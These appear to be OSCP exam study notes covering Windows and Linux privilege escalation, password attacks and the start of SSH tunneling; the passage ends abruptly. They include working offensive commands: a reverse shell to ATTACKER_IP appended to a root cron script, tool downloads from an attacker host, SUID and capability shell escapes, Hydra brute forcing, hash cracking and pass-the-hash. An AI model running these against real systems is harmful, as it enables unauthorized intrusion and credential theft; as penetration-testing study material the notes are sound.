```
whoami /priv
```

If enabled:

```
SeBackupPrivilege
```

This can allow processes to bypass normal file ACL restrictions when using backup semantics.

Potentially interesting for accessing protected files such as registry hives.

Concept:

```
SeBackupPrivilege
      ↓
Read protected files
      ↓
Sensitive data / credential material
      ↓
Potential privilege escalation
```

---

## 28. SeRestorePrivilege

```
whoami /priv
```

Allows privileged restore operations and can become dangerous when combined with writable/replaceable system resources.

Always evaluate:

```
Privilege
+
What resources can be modified?
+
Can modified resource be executed/loaded?
```

---

## 29. SeTakeOwnershipPrivilege

```
whoami /priv
```

Potential chain:

```
Take ownership
      ↓
Modify ACL
      ↓
Gain access to protected resource
      ↓
Use resource for escalation
```

Ownership alone does **not** automatically mean Administrator/SYSTEM.

---

## 30. SeDebugPrivilege

```
whoami /priv
```

This privilege can allow interaction with processes that would normally be inaccessible.

Potentially interesting targets:

```
SYSTEM processes
LSASS
Privileged services
```

Handle carefully in real environments because interacting with sensitive processes can have operational consequences.

---

## 31. Unattended Installation Files

Search:

```
C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\Sysprep\
```

Common files:

```
Unattend.xml
Autounattend.xml
```

Search:

```
dir C:\ /s /b unattend.xml 2>nul
dir C:\ /s /b autounattend.xml 2>nul
```

These can contain deployment credentials.

---

## 32. IIS / Web Server

If IIS is installed:

```
iisreset /status
```

Check:

```
C:\inetpub\
```

Potential locations:

```
web.config
applicationHost.config
application files
backup files
```

Search configuration for:

```
connectionString
password
username
```

A web application compromise can sometimes become:

```
Web user
 ↓
Service account
 ↓
Credential discovery
 ↓
Local privilege escalation
```

---

## 33. Third-Party Software

Enumerate:

```
wmic product get name,version
```

PowerShell:

```
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
```

Also:

```
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

Look for:

- Old software
- Custom services
- Backup software
- Monitoring agents
- Security software
- Development tools
- Database servers

---

## 34. Automated Enumeration

Useful tools in OSCP labs:

### WinPEAS

```
winPEAS.exe
```

Checks many common privilege-escalation vectors automatically.

### PowerUp

PowerShell-based enumeration:

```
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

### Seatbelt

Useful for Windows security enumeration.

### AccessChk

Useful for checking:

```
File permissions
Registry permissions
Service permissions
```

**OSCP mindset:** Don't blindly trust automated output. Verify every finding manually.

---

## 35. Manual Enumeration Methodology

Use this order:

```
1. whoami
2. whoami /priv
3. whoami /groups
4. systeminfo
5. hostname
6. net user
7. net localgroup administrators
8. ipconfig /all
9. netstat -ano
10. tasklist /svc
11. services
12. scheduled tasks
13. writable files/directories
14. registry
15. credentials
16. installed software
17. automated enumeration
```

Then build hypotheses.

---

## 36. Privilege Escalation Decision Tree

```
Initial Shell
     │
     ├── Interesting privileges?
     │       ├── Yes → Investigate token abuse
     │       └── No
     │
     ├── Vulnerable Windows version?
     │       ├── Yes → Verify exploit applicability
     │       └── No
     │
     ├── Weak service?
     │       ├── Yes → Service escalation
     │       └── No
     │
     ├── Writable scheduled task?
     │       ├── Yes → Task escalation
     │       └── No
     │
     ├── Credentials?
     │       ├── Yes → Validate privilege level
     │       └── No
     │
     ├── Writable privileged executable/DLL?
     │       ├── Yes → Hijacking/replacement
     │       └── No
     │
     └── Continue enumeration
```

---

## 37. The Core OSCP Mental Model

Don't ask:

> **"What exploit can I run?"**

Ask:

> **"What privileged action can I influence?"**

Look for:

```
Privileged Process
       +
Attacker-Controlled Input
       ↓
Execution / File Write / DLL Load / Configuration Change
       ↓
Privilege Escalation
```

The most common Windows PE categories to master are:

```
Weak Services
Unquoted Service Paths
Service Binary Hijacking
DLL Hijacking
Scheduled Tasks
PATH Hijacking
Registry Misconfigurations
AlwaysInstallElevated
Weak File/Directory Permissions
Token Impersonation
Dangerous Privileges
Stored Credentials
Sensitive Configuration Files
Windows Vulnerabilities
```

### OSCP Rule

**Enumeration → Identify trust boundary → Find attacker-controlled component → Prove privileged execution → Escalate.**
# ==Linux Privilege Escalation==
![[Linux_Logo_in_Linux_Libertine_Font.svg.webp|529]]
## 1. Overview

**Privilege Escalation** = gaining higher privileges than the current user.

Typical goal:

```
Low-privileged user
       ↓
Enumerate
       ↓
Find weakness
       ↓
Exploit
       ↓
root
```

Linux privilege escalation commonly involves:

- SUID / SGID binaries
- `sudo` misconfigurations
- Linux capabilities
- Cron jobs
- Writable files/directories
- Weak permissions
- PATH hijacking
- Services
- Kernel exploits
- Credentials/passwords
- SSH keys
- NFS
- Docker/LXC
- Environment variables
- Scripts executed as root

---

## 2. Initial Enumeration

First identify who you are and what system you are on.

```
whoami
id
hostname
uname -a
```

More detailed OS information:

```
cat /etc/os-release
cat /etc/issue
```

Kernel:

```
uname -r
```

Architecture:

```
arch
```

Current shell:

```
echo $SHELL
```

Environment variables:

```
env
```

Current PATH:

```
echo $PATH
```

---

## 3. User Enumeration

Current user:

```
whoami
```

User ID and groups:

```
id
```

All users:

```
cat /etc/passwd
```

Users with interactive shells:

```
cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
```

Root user:

```
cat /etc/passwd | grep 'root'
```

Logged-in users:

```
w
```

```
who
```

Home directories:

```
ls -la /home
```

---

## 4. Groups

Groups can provide additional privileges.

```
id
```

Look for interesting groups such as:

```
sudo
docker
lxd
disk
adm
shadow
```

Check group membership:

```
groups
```

Example:

```
uid=1001(user) gid=1001(user) groups=1001(user),27(sudo)
```

Membership in `sudo` may allow privilege escalation.

---

## 5. Sudo

Check sudo permissions:

```
sudo -l
```

This is one of the first commands to run.

Example:

```
User user may run the following commands:
    (root) /usr/bin/vim
```

If allowed:

```
sudo vim
```

Then from Vim:

```
:!bash
```

This can result in a root shell if the sudo rule permits it.

### Important

Look for:

```
(root) NOPASSWD:
```

Example:

```
(root) NOPASSWD: /usr/bin/find
```

GTFOBins can help identify known privilege-escalation techniques for permitted binaries.

---

## 6. SUID

SUID causes a program to execute with the privileges of its file owner.

Find SUID files:

```
find / -perm -4000 -type f 2>/dev/null
```

Alternative:

```
find / -perm -u=s -type f 2>/dev/null
```

Example:

```
/usr/bin/passwd
/usr/bin/su
/usr/bin/find
```

Check permissions:

```
ls -la /usr/bin/find
```

Example:

```
-rwsr-xr-x 1 root root ...
```

The `s` indicates SUID.

### Exploitation

If an unusual binary has SUID and provides command execution, investigate whether it can execute a shell as its owner.

For example, a vulnerable SUID `find`:

```
find . -exec /bin/sh -p \; -quit
```

`-p` preserves privileges in shells that support it.

---

## 7. SGID

SGID is similar to SUID but executes with the file's group privileges.

Find SGID files:

```
find / -perm -2000 -type f 2>/dev/null
```

Or:

```
find / -perm -g=s -type f 2>/dev/null
```

Check:

```
ls -la <file>
```

---

## 8. Linux Capabilities

Capabilities divide traditional root privileges into smaller permissions.

Find capabilities:

```
getcap -r / 2>/dev/null
```

Interesting example:

```
/usr/bin/python3 = cap_setuid+ep
```

A binary with `cap_setuid` may be able to change its UID.

Example:

```
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Then:

```
id
```

Look for:

```
uid=0(root)
```

Common interesting capabilities:

```
cap_setuid
cap_setgid
cap_dac_override
cap_dac_read_search
cap_sys_admin
```

---

## 9. Cron Jobs

Cron jobs may execute commands periodically.

List system cron configuration:

```
cat /etc/crontab
```

```
ls -la /etc/cron.*
```

```
cat /etc/cron.d/*
```

Check running cron processes:

```
ps aux | grep cron
```

Look for scripts executed as root:

```
* * * * * root /opt/scripts/backup.sh
```

Then check:

```
ls -la /opt/scripts/backup.sh
```

If the script is writable:

```
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /opt/scripts/backup.sh
```

When the root cron job executes it, the payload runs as root.

### Key question

```
Who executes the job?
        ↓
What file does it execute?
        ↓
Can my user modify that file?
        ↓
Can I modify anything the script executes?
```

---

## 10. Writable Files

Find files writable by the current user:

```
find / -writable -type f 2>/dev/null
```

More targeted:

```
find / -writable -type f 2>/dev/null | grep -v '/proc/'
```

Writable directories:

```
find / -writable -type d 2>/dev/null
```

Focus on writable files that are:

- Executed by root
- Loaded by privileged services
- Used by cron
- Configuration files
- Scripts
- Libraries

---

## 11. Writable `/etc/passwd`

Check:

```
ls -la /etc/passwd
```

Normally:

```
-rw-r--r-- root root /etc/passwd
```

If writable, a user may potentially modify account entries.

Generate a password hash:

```
openssl passwd -6 password123
```

Then add a privileged account entry to `/etc/passwd`.

Example format:

```
newroot:<HASH>:0:0:root:/root:/bin/bash
```

Then:

```
su newroot
```

This technique is only relevant when `/etc/passwd` is actually writable.

---

## 12. Writable `/etc/shadow`

Check:

```
ls -la /etc/shadow
```

If readable:

```
cat /etc/shadow
```

You may find password hashes that can potentially be cracked offline.

Example:

```
root:$6$...:...
```

Use appropriate password-cracking tools during authorized testing.

---

## 13. Password Hunting

Search configuration files for credentials:

```
grep -RniE 'password|passwd|pwd|secret|token|apikey|api_key' /etc 2>/dev/null
```

Search home directories:

```
grep -RniE 'password|passwd|secret|token' /home 2>/dev/null
```

Search common configuration locations:

```
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.ini" \) 2>/dev/null
```

Check:

```
~/.bash_history
```

```
~/.mysql_history
```

```
~/.ssh/
```

---

## 14. SSH Keys

Check the current user's SSH directory:

```
ls -la ~/.ssh
```

Potentially interesting files:

```
id_rsa
id_ed25519
authorized_keys
known_hosts
config
```

Private key:

```
cat ~/.ssh/id_rsa
```

If a readable private key belongs to another privileged account, investigate whether it can be used for authorized SSH access.

Check permissions:

```
ls -la ~/.ssh/
```

---

## 15. PATH Hijacking

Check:

```
echo $PATH
```

Suppose a root script executes:

```
tar
```

instead of:

```
/usr/bin/tar
```

If the script runs with a PATH containing a directory writable by your user, you may be able to create a malicious executable named:

```
tar
```

Example:

```
echo '#!/bin/bash' > /tmp/tar
echo 'bash -p' >> /tmp/tar
chmod +x /tmp/tar
```

Then manipulate PATH so `/tmp` appears before the legitimate binary.

The key condition is:

```
Privileged process
       +
Relative command
       +
Writable PATH directory
       =
Potential PATH hijacking
```

---

## 16. Library Hijacking

Look for privileged programs loading libraries from writable locations.

Check libraries:

```
ldd /path/to/binary
```

Example:

```
libexample.so => /usr/local/lib/libexample.so
```

Check permissions:

```
ls -la /usr/local/lib/libexample.so
```

If a privileged program loads a library that your user can replace, this may lead to privilege escalation.

---

## 17. Processes

Enumerate running processes:

```
ps aux
```

More detailed:

```
ps auxww
```

Process tree:

```
ps aux --forest
```

Look for:

- Root processes
- Custom applications
- Scripts
- Backup tools
- Monitoring software
- Databases
- Services
- Unusual binaries

Check command lines:

```
ps -ef
```

---

## 18. Services

List services:

```
systemctl list-units --type=service
```

Running services:

```
systemctl --type=service --state=running
```

Check a specific service:

```
systemctl status <service>
```

Look for custom services running as root.

Example:

```
ExecStart=/opt/app/start.sh
```

Then:

```
ls -la /opt/app/start.sh
```

If writable, investigate whether modifying it gives code execution as the service user/root.

---

## 19. Network Enumeration

Listening ports:

```
ss -tulpn
```

Alternative:

```
netstat -tulpn
```

Current connections:

```
ss -antp
```

Look for local-only services:

```
127.0.0.1:3306
127.0.0.1:8080
127.0.0.1:9000
```

These may expose services that aren't reachable externally.

---

## 20. NFS

Check NFS exports:

```
cat /etc/exports
```

From another machine:

```
showmount -e <TARGET>
```

If an NFS share allows dangerous permissions such as `no_root_squash`, investigate it carefully.

Example:

```
/home *(rw,no_root_squash)
```

`no_root_squash` can allow root privileges on the client to be preserved when accessing the NFS share.

---

## 21. Docker

Check Docker membership:

```
id
```

or:

```
groups
```

If the user belongs to:

```
docker
```

check:

```
docker ps
```

Docker access can effectively provide root-level control over the host depending on configuration.

---

## 22. LXC / LXD

Check:

```
id
```

Look for:

```
lxd
```

or:

```
lxc
```

Enumerate:

```
lxc list
```

LXD/LXC group membership can be security-sensitive because it may provide powerful container-management capabilities.

---

## 23. Kernel Exploits

Identify kernel:

```
uname -a
```

```
uname -r
```

Identify distribution:

```
cat /etc/os-release
```

Search for known vulnerabilities matching:

```
Kernel version
+
Distribution
+
Architecture
```

Do **not** immediately run a kernel exploit.

First determine:

```
Is the kernel vulnerable?
        ↓
Does the exploit match the exact version?
        ↓
Does it support the architecture?
        ↓
Is it stable?
        ↓
Could it crash the machine?
```

Kernel exploitation should generally be a later option because it can be unstable.

---

## 24. Automated Enumeration

### LinPEAS

Transfer:

```
wget http://ATTACKER_IP/linpeas.sh
```

or:

```
curl http://ATTACKER_IP/linpeas.sh -o linpeas.sh
```

Run:

```
chmod +x linpeas.sh
./linpeas.sh
```

Useful for identifying:

- SUID
- Capabilities
- Cron
- Credentials
- Services
- Writable files
- Interesting permissions
- Kernel information

### Linux Smart Enumeration

```
./lse.sh
```

### pspy

`pspy` is useful for observing processes without requiring root.

```
./pspy64
```

Especially useful for discovering:

```
cron jobs
scripts
automated commands
temporary processes
```

---

## 25. Manual Enumeration Checklist

```
[ ] whoami
[ ] id
[ ] hostname
[ ] uname -a
[ ] /etc/os-release
[ ] sudo -l

[ ] /etc/passwd
[ ] /etc/shadow
[ ] groups

[ ] SUID
[ ] SGID
[ ] Capabilities

[ ] Cron
[ ] Writable files
[ ] Writable directories

[ ] Running processes
[ ] Services
[ ] Listening ports

[ ] PATH
[ ] Environment variables
[ ] LD_PRELOAD / library loading

[ ] SSH keys
[ ] Bash history
[ ] Configuration files
[ ] Credentials

[ ] NFS
[ ] Docker
[ ] LXD/LXC

[ ] Kernel version
[ ] Kernel exploits
```

---

## 26. Privilege Escalation Methodology

Use this order during an OSCP-style machine:

```
1. Identify user
        ↓
2. Identify OS/kernel
        ↓
3. sudo -l
        ↓
4. Groups
        ↓
5. SUID / SGID
        ↓
6. Capabilities
        ↓
7. Cron
        ↓
8. Writable files/directories
        ↓
9. Processes/services
        ↓
10. Credentials
        ↓
11. PATH/library hijacking
        ↓
12. NFS/Docker/LXD
        ↓
13. Kernel exploits
```

The goal is **not** to run every enumeration command blindly.

Instead:

```
Enumerate
   ↓
Find anomaly
   ↓
Understand why it is interesting
   ↓
Validate permissions
   ↓
Exploit
   ↓
Confirm root
```

---

## 27. Root Confirmation

After successful escalation:

```
whoami
```

```
id
```

Expected:

```
uid=0(root)
```

Also:

```
hostname
```

Capture proof of privilege escalation for your notes/report.

---

## 28. OSCP Mindset

The most important question is:

> **What can my current user control that a privileged process trusts?**

Think in terms of:

```
USER CONTROL
     ↓
FILE
     ↓
SCRIPT
     ↓
BINARY
     ↓
SERVICE
     ↓
ROOT
```

For every suspicious object ask:

```
Who owns it?
Who can read it?
Who can write it?
Who executes it?
With what privileges?
What does it execute/load?
Can I influence that execution?
```

That mindset is more important than memorizing individual exploits.


# ==Password Attacks== 
![[1_mjk9IWbb-mRmHRrD-qGdcg.jpg]]
OffSec's current OSCP+ Body of Knowledge lists **SSH/RDP login attacks, HTTP POST login attacks, password-cracking fundamentals, wordlist mutation, password-manager key files, SSH private-key passphrases, NTLM/Net-NTLMv2 cracking, Pass-the-Hash, and Net-NTLMv2 relay** under Password Attacks.

---

## 1. Password Attack Methodology

The basic workflow:

```
Identify Authentication
        ↓
Enumerate Valid Users
        ↓
Identify Attack Surface
        ↓
Obtain Password / Hash / Authentication Material
        ↓
Crack or Abuse It
        ↓
Authenticate
        ↓
Enumerate Again
        ↓
Privilege Escalation / Lateral Movement
```

Before attacking, determine:

```
What service?
What username?
What authentication mechanism?
Password or hash?
Online or offline attack?
Is lockout/rate limiting present?
```

---

## 2. Password Attack Types

### Online attacks

Attack a live authentication service:

```
SSH
RDP
HTTP login
SMB
FTP
WinRM
```

Examples:

- Password spraying
- Credential stuffing
- Brute force
- Dictionary attacks

### Offline attacks

Obtain password hashes first, then crack them locally.

```
Hash
 ↓
Hashcat / John
 ↓
Password
```

Offline cracking is generally much faster because there is no network authentication request for every guess.

---

## 3. Password Cracking Fundamentals

### Hashing

A hash is a one-way representation of data.

```
password
   ↓
hash function
   ↓
hash
```

Example:

```
password123
    ↓
5f4dcc3b5aa765d61d8327deb882cf99
```

You don't normally "decrypt" a password hash.

You attempt:

```
candidate password
        ↓
     hash it
        ↓
compare with target hash
```

If they match:

```
candidate = password
```

---

## 4. Hashing vs Encryption vs Encoding

### Hashing

One-way:

```
password → hash
```

### Encryption

Reversible with a key:

```
plaintext → ciphertext → plaintext
```

### Encoding

Changes representation:

```
data → encoded data → original data
```

Examples:

```
Base64
URL encoding
Hex
```

**Important:** Base64 is not encryption.

---

## 5. Salts

A **salt** is additional random data added before hashing.

```
password + random salt
          ↓
        hash
```

Purpose:

- Prevent identical passwords from producing identical hashes.
- Make precomputed rainbow tables less useful.
- Increase cracking difficulty.

Example:

```
password = password123
salt     = X7a91...
             ↓
       password + salt
             ↓
           hash
```

---

## 6. Wordlists

Common Kali wordlist:

```
/usr/share/wordlists/rockyou.txt
```

If compressed:

```
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

Use:

```
ls -lh /usr/share/wordlists/
```

Common approach:

```
rockyou.txt
    ↓
customize
    ↓
target-specific wordlist
    ↓
crack
```

---

## 7. Creating Custom Wordlists

Target information can produce useful password candidates.

Example:

```
Company: Acme
Year: 2025
Product: Apollo
```

Potential combinations:

```
Acme2025
Acme@2025
Apollo2025
Acme123
Apollo123
```

### CeWL

CeWL can crawl a website and generate words from its content.

```
cewl http://TARGET -w words.txt
```

Then:

```
cat words.txt
```

This is useful when the target's password policy or naming conventions are predictable.

---

## 8. Wordlist Mutation

A basic wordlist might contain:

```
password
company
admin
apollo
```

Mutation can create:

```
Password
password1
Password1
Password123
password!
Apollo2025
Apollo@2025
```

With Hashcat rules:

```
hashcat -m <MODE> hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

Rules can perform transformations such as:

- Capitalization
- Appending numbers
- Adding symbols
- Replacing characters
- Reversing words

---

## 9. Password Policy

Always look for password requirements.

For example:

```
Minimum 8 characters
1 uppercase
1 lowercase
1 number
1 special character
```

This helps determine whether a wordlist needs mutation.

In Active Directory:

```
Minimum password length
Password history
Password complexity
Account lockout threshold
Lockout duration
```

---

## 10. Brute Force

Brute force attempts combinations systematically.

Example:

```
aaaa
aaab
aaac
...
zzzz
```

The search space grows rapidly.

For a character set of size `C` and password length `L`:

```
C^L
```

Example:

```
26^8 = 208,827,064,576
```

Therefore, blindly brute-forcing long passwords is usually inefficient.

---

## 11. Dictionary Attack

Instead of generating every possible combination:

```
password
123456
qwerty
admin
letmein
welcome
```

The attacker tests known/common passwords.

Usually much more efficient than pure brute force.

---

## 12. Password Spraying

Password spraying uses:

```
ONE password
   ↓
many usernames
```

Example:

```
user1 : Winter2025!
user2 : Winter2025!
user3 : Winter2025!
user4 : Winter2025!
```

This is different from brute force:

```
Brute force:
one user + many passwords

Password spraying:
many users + one/few passwords
```

The goal is to avoid triggering account lockout policies.

Only perform this against authorized targets.

---

## 13. Credential Stuffing

Credential stuffing uses previously leaked username/password combinations.

```
user@example.com : Password123
```

Then attempts them against another service.

Difference:

```
Brute Force
→ guesses passwords

Password Spraying
→ one password against many accounts

Credential Stuffing
→ known username/password combinations
```

---

## 14. SSH Password Attacks

SSH:

```
TCP/22
```

Normal login:

```
ssh user@TARGET
```

Hydra:

```
hydra -l user -P passwords.txt ssh://TARGET
```

Multiple usernames:

```
hydra -L users.txt -P passwords.txt ssh://TARGET
```

Useful options:

```
hydra -h
```

### Important

Before attacking SSH:

```
Is password authentication enabled?
Is the username valid?
Is there rate limiting?
Is there account lockout?
```

---

## 15. RDP Password Attacks

RDP normally uses:

```
TCP/3389
```

Hydra:

```
hydra -l administrator -P passwords.txt rdp://TARGET
```

Once credentials are obtained:

```
xfreerdp /v:TARGET /u:user /p:'password'
```

---

## 16. HTTP POST Login

First understand the login request.

Example:

```
POST /login HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

username=admin&password=test
```

Important parameters:

```
username
password
```

Hydra can attack HTTP POST forms.

Generic structure:

```
hydra -l admin -P passwords.txt TARGET http-post-form \
"/login:username=^USER^&password=^PASS^:F=Invalid"
```

The exact syntax depends on the application.

### Important part

Identify the failure condition:

```
Invalid username/password
Login failed
Incorrect credentials
```

Hydra needs a reliable way to distinguish failure from success.

---

## 17. Burp Suite + Login Analysis

Before using Hydra:

1. Open Burp.
2. Submit a normal login.
3. Capture the request.
4. Identify:
    - Method
    - URL
    - Parameters
    - Cookies
    - CSRF token
    - Success/failure response
5. Determine whether the request can be automated.

Example:

```
POST /login
username=admin
password=test
csrf=abc123
```

If a CSRF token changes on every request, a simple Hydra attack may not work.

---

## 18. Password Manager Files

Password managers may store encrypted credential databases.

Common examples:

```
KeePass
```

KeePass database:

```
.kdbx
```

If you obtain an authorized `.kdbx` file, the objective is:

```
KDBX
 ↓
identify protection
 ↓
attack master password
 ↓
recover password
 ↓
access stored credentials
```

John can generate a crackable representation:

```
keepass2john database.kdbx > hash.txt
```

Then:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Check:

```
john --show hash.txt
```

---

## 19. SSH Private Key Passphrase

An SSH private key may itself be protected by a passphrase.

Example:

```
id_rsa
   ↓
encrypted private key
   ↓
passphrase required
```

Convert it for John:

```
ssh2john id_rsa > ssh_hash.txt
```

Crack:

```
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
```

Show result:

```
john --show ssh_hash.txt
```

Then:

```
chmod 600 id_rsa
ssh -i id_rsa user@TARGET
```

---

## 20. John the Ripper

Basic:

```
john hash.txt
```

Wordlist:

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Show cracked passwords:

```
john --show hash.txt
```

Identify hash format:

```
john --list=formats
```

Specify format:

```
john --format=<FORMAT> hash.txt
```

---

## 21. Hashcat

Basic syntax:

```
hashcat -m <HASH_MODE> hash.txt wordlist.txt
```

Example:

```
hashcat -m 1000 ntlm.txt rockyou.txt
```

Useful options:

```
hashcat --help
```

Show cracked passwords:

```
hashcat -m 1000 ntlm.txt rockyou.txt --show
```

Rules:

```
hashcat -m 1000 ntlm.txt rockyou.txt \
-r /usr/share/hashcat/rules/best64.rule
```

---

## 22. NTLM

NTLM hashes are commonly encountered during Windows/AD attacks.

Example format:

```
Administrator:RID:LM:NTLM:::
```

The NT hash can be attacked offline.

Hashcat:

```
hashcat -m 1000 ntlm.txt rockyou.txt
```

John:

```
john --format=NT ntlm.txt
```

---

## 23. Obtaining NTLM Hashes

Potential sources include:

```
SAM database
NTDS.dit
Credential dumping
Backups
Configuration files
Memory
```

During OSCP, you may encounter hashes after gaining access to a Windows machine or through AD attacks.

The important workflow is:

```
Obtain NTLM
     ↓
Identify format
     ↓
Crack offline
     ↓
Recover password
     ↓
Test credentials
```

---

## 24. Pass-the-Hash

Pass-the-Hash allows authentication using an NTLM hash instead of knowing the plaintext password.

Conceptually:

```
Username + NTLM hash
          ↓
      Authentication
          ↓
      Windows service
```

You do **not** need to recover the plaintext password first.

Common tools include:

```
impacket-psexec
impacket-wmiexec
impacket-smbexec
```

Example:

```
impacket-psexec domain/user@TARGET -hashes :NTLM_HASH
```

The syntax commonly separates:

```
LM_HASH:NT_HASH
```

If only the NT hash is known:

```
:NT_HASH
```

---

## 25. Net-NTLMv2

Net-NTLMv2 is different from an NTLM password hash.

It is commonly captured during network authentication.

Basic concept:

```
Victim
   ↓
Authentication challenge
   ↓
Net-NTLMv2 response
   ↓
Attacker captures response
   ↓
Offline cracking
```

The captured response can potentially be cracked to recover the user's password.

---

## 26. Net-NTLMv2 Cracking

Once a Net-NTLMv2 challenge/response is captured:

```
hashcat -m 5600 hash.txt rockyou.txt
```

`5600` is the Hashcat mode commonly used for Net-NTLMv2.

Workflow:

```
Capture Net-NTLMv2
        ↓
Identify username/domain
        ↓
Save response
        ↓
Hashcat/John
        ↓
Recover password
```

---

## 27. NTLM Relay

Instead of cracking the captured Net-NTLMv2 response, it may sometimes be possible to **relay** the authentication to another service.

Concept:

```
Victim
   │
   │ NTLM authentication
   ↓
Attacker
   │
   │ relay
   ↓
Target service
```

The attacker forwards authentication rather than learning the password.

Important prerequisites can include:

```
NTLM authentication available
+
Relay target available
+
Signing / protocol protections allow relay
+
Network positioning
```

Common tooling includes:

```
ntlmrelayx
Responder
```

---

## 28. Common Password Attack Decision Tree

```
Found login service?
        │
        ├── SSH → password attack
        │
        ├── RDP → password attack
        │
        ├── HTTP → analyze POST request
        │
        └── SMB/WinRM/etc.
                ↓
          Identify auth method
```

If you obtain a hash:

```
Hash
 ↓
Identify type
 ↓
Can crack?
 ├── YES → John / Hashcat
 └── NO
      ↓
Can authenticate with hash?
      ↓
Pass-the-Hash / other technique
```

---

## 29. Password Hunting on Compromised Hosts

After initial access, search for credentials.

```
history
```

```
cat ~/.bash_history
```

Search configuration files:

```
grep -RniE 'password|passwd|pwd|secret|token' /etc 2>/dev/null
```

Search home directories:

```
grep -RniE 'password|passwd|secret|token' /home 2>/dev/null
```

Look for:

```
.env
config.php
web.config
application.properties
database.yml
settings.py
backup files
SSH keys
password manager databases
```

---

## 30. Password Reuse

One discovered password can be valuable beyond the original service.

Example:

```
Found:
john : Winter2025!
```

Test the credential against authorized services:

```
SSH
SMB
RDP
WinRM
Web application
Database
```

But don't assume reuse.

```
Credential discovered
        ↓
Identify username
        ↓
Identify valid services
        ↓
Test carefully
        ↓
New access
```

---

## 31. Credential Validation

When you recover a password:

```
username = administrator
password = Password123
```

Do not immediately assume success.

Validate:

```
ssh administrator@TARGET
```

or:

```
smbclient -L //TARGET -U administrator
```

or:

```
evil-winrm -i TARGET -u administrator -p 'Password123'
```

---

## 32. OSCP Password Attack Workflow

```
1. Enumerate services
        ↓
2. Identify authentication
        ↓
3. Enumerate usernames
        ↓
4. Check for exposed credentials
        ↓
5. Try discovered credentials
        ↓
6. Build target-specific wordlist
        ↓
7. Perform controlled online attack
        ↓
8. Capture hashes when possible
        ↓
9. Crack hashes offline
        ↓
10. Test recovered credentials
        ↓
11. Look for password reuse
        ↓
12. Continue enumeration
```

---

## 33. Commands Cheat Sheet

### SSH

```
ssh user@TARGET
hydra -l user -P passwords.txt ssh://TARGET
```

### RDP

```
xfreerdp /v:TARGET /u:user /p:'password'
hydra -l user -P passwords.txt rdp://TARGET
```

### HTTP POST

```
hydra -l user -P passwords.txt TARGET http-post-form \
"/login:user=^USER^&pass=^PASS^:F=Invalid"
```

### CeWL

```
cewl http://TARGET -w words.txt
```

### John

```
john --wordlist=rockyou.txt hash.txt
john --show hash.txt
```

### Hashcat

```
hashcat -m <MODE> hash.txt rockyou.txt
hashcat -m <MODE> hash.txt rockyou.txt --show
```

### KeePass

```
keepass2john database.kdbx > hash.txt
john --wordlist=rockyou.txt hash.txt
```

### SSH key

```
ssh2john id_rsa > hash.txt
john --wordlist=rockyou.txt hash.txt
```

### NTLM

```
hashcat -m 1000 ntlm.txt rockyou.txt
```

### Net-NTLMv2

```
hashcat -m 5600 netntlm.txt rockyou.txt
```

### Pass-the-Hash

```
impacket-psexec domain/user@TARGET -hashes :NTLM_HASH
```

---

## 34. OSCP Quick Checklist

```
[ ] Identify authentication service
[ ] Enumerate usernames
[ ] Check default/common credentials
[ ] Check exposed credentials
[ ] Check password reuse
[ ] Analyze HTTP login requests
[ ] Check SSH
[ ] Check RDP
[ ] Build custom wordlist
[ ] Mutate wordlist
[ ] Perform controlled password attacks
[ ] Obtain password hashes
[ ] Identify hash type
[ ] Crack with John/Hashcat
[ ] Attack password manager files
[ ] Attack SSH key passphrases
[ ] Understand NTLM
[ ] Crack NTLM
[ ] Pass-the-Hash
[ ] Capture/crack Net-NTLMv2
[ ] Understand NTLM relay
```

## Core OSCP Mental Model

```
              PASSWORD ATTACKS
                     │
        ┌────────────┴────────────┐
        ↓                         ↓
   ONLINE ATTACKS            OFFLINE ATTACKS
        │                         │
   SSH / RDP / HTTP          Hash / Key / KDBX
        │                         │
   Hydra / Burp              John / Hashcat
        │                         │
        └────────────┬────────────┘
                     ↓
              VALID CREDENTIAL
                     ↓
              AUTHENTICATE
                     ↓
          ENUMERATE AGAIN
```

For the **2025 OSCP/PEN-200 scope**, the official material specifically includes SSH/RDP, HTTP POST login attacks, wordlist mutation/cracking methodology, password managers, SSH private-key passphrases, NTLM, Pass-the-Hash, Net-NTLMv2, and NTLM relay.

# ==Port Redirection and Tunneling==

## 1. What Is Port Redirection?

**Port redirection** forwards traffic from one host/port to another host/port.

Example:

```text
Attacker
   |
   | TCP 8080
   v
Compromised Host
   |
   | TCP 80
   v
Internal Web Server
```

The attacker connects to the compromised machine on port `8080`, and the compromised machine forwards the traffic to an internal server on port `80`.

### Why Use It?

- Access services that are not directly reachable.
    
- Pivot into internal networks.
    
- Reach localhost-only services.
    
- Bypass network segmentation.
    
- Expose internal services through an accessible host.
    

---

## 2. Tunneling

**Tunneling** encapsulates traffic inside another connection/protocol.

Common examples:

- SSH tunneling
    
- SOCKS proxies
    
- Chisel
    
- Ligolo-ng
    
- ProxyChains
    
- SSH dynamic port forwarding
    

A tunnel can allow the attacker to communicate with hosts that cannot directly communicate with the attacker.

---

## 3. Port Forwarding Types

There are three important SSH forwarding types:

```text
Local Port Forwarding
Remote Port Forwarding
Dynamic Port Forwarding
```

---

## 4. SSH Local Port Forwarding

Syntax:

```bash
ssh -L <local_port>:<target>:<target_port> user@ssh_server
```

Example:

```bash
ssh -L 8080:10.10.10.20:80 user@10.10.10.10
```

Traffic flow:

```text
Attacker:8080
     |
     | SSH tunnel
     v
10.10.10.10
     |
     v
10.10.10.20:80
```

Now access:

```bash
curl http://127.0.0.1:8080
```

The SSH server (`10.10.10.10`) connects to:

```text
10.10.10.20:80
```

### When to Use

Use local forwarding when:

- You can SSH into a pivot host.
    
- The pivot can reach the internal target.
    
- You want the internal service available on your local machine.
    

---

## 5. SSH Remote Port Forwarding

Syntax:

```bash
